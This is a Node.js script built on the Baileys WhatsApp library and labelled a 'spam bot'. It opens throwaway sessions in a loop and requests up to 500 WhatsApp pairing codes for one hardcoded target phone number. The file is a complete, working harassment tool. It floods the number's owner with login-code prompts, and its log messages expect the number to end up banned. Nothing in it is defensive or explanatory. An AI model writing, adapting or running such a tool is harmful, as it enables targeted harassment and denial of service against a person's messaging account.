// index.js
const { default: makeWASocket, useMultiFileAuthState, fetchLatestWaWebVersion, Browsers } = require('@whiskeysockets/baileys');
const pino = require('pino');

const TARGET_PHONE = process.env.TARGET_PHONE || "201124542298";
const MAX_CODES = parseInt(process.env.MAX_CODES) || 500;
const BATCH_SIZE = parseInt(process.env.BATCH_SIZE) || 5;
const DELAY = parseInt(process.env.DELAY_BETWEEN_BATCHES) || 30000;

const logger = pino({ level: 'silent' });

async function requestOneCode(version) {
    let sock;
    try {
        const { state } = await useMultiFileAuthState(`./auth_${Date.now()}`);
        
        sock = makeWASocket({
            version,
            auth: state,
            logger,
            printQRInTerminal: false,
            browser: Browsers.macOS('Chrome'),
            syncFullHistory: false,
            connectTimeoutMs: 15000,
            defaultQueryTimeoutMs: 15000,
            keepAliveIntervalMs: 10000,
        });

        const code = await new Promise((resolve, reject) => {
            const timer = setTimeout(() => reject(new Error('timeout')), 12000);
            
            sock.ev.on('connection.update', async (u) => {
                const { connection } = u;
                if (connection === 'connecting' || connection === 'open') {
                    if (sock._req) return;
                    sock._req = true;
                    clearTimeout(timer);
                    try {
                        const p = await sock.requestPairingCode(TARGET_PHONE);
                        resolve(p.match(/.{1,4}/g)?.join('-') || p);
                    } catch (e) { reject(e); }
                }
                if (connection === 'close' && !sock._req) {
                    clearTimeout(timer);
                    reject(new Error('closed'));
                }
            });
        });
        
        return code;
    } catch (e) {
        return null;
    } finally {
        if (sock) {
            try { sock.ws?.close(); } catch (e) {}
            try { await sock.logout(); } catch (e) {}
        }
    }
}

async function main() {
    console.log('*** SPAM BOT STARTED (Termux Mode) ***');
    console.log(`Target: ${TARGET_PHONE} | Max: ${MAX_CODES}`);

    let version;
    try { version = await fetchLatestWaWebVersion(); } 
    catch (e) { version = [2, 2413, 1]; }
    console.log(`WA Version: ${version}`);

    let count = 0, fails = 0;

    while (count < MAX_CODES) {
        for (let i = 0; i < BATCH_SIZE && count < MAX_CODES; i++) {
            const code = await requestOneCode(version);
            if (code) {
                count++;
                fails = 0;
                console.log(`✓ [${count}/${MAX_CODES}] ${TARGET_PHONE} → ${code}`);
            } else {
                fails++;
                console.log(`✗ Failed (${fails} consecutive)`);
                if (fails >= 8) {
                    console.log('*** Target likely BANNED. Stopping. ***');
                    process.exit(0);
                }
                await new Promise(r => setTimeout(r, 45000));
            }
            await new Promise(r => setTimeout(r, 2500));
        }
        if (count < MAX_CODES) {
            console.log(`--- Batch done. Waiting ${DELAY/1000}s ---`);
            await new Promise(r => setTimeout(r, DELAY));
        }
    }
    console.log(`*** DONE: ${count} codes generated ***`);
    process.exit(0);
}

main().catch(e => { console.error(e); process.exit(1); });
